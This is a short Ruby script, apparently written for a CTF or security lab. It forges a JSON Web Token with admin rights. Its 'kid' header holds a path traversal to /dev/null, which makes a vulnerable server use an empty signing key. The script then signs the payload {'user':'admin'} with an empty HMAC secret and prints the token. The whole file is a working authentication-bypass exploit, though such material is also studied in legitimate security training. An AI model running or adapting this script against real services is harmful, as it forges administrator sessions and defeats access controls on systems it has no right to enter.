header = '{"typ":"JWT", "alg":"HS256","kid":"../../../../../../../../../dev/null"}'
payload = '{"user":"admin"}'

require 'base64'
require 'openssl'

data = Base64.strict_encode64(header)+"."+ Base64.strict_encode64(payload)
data.gsub!("=","")

secret = ""

signature = Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), secret, data))

puts data+"."+signature
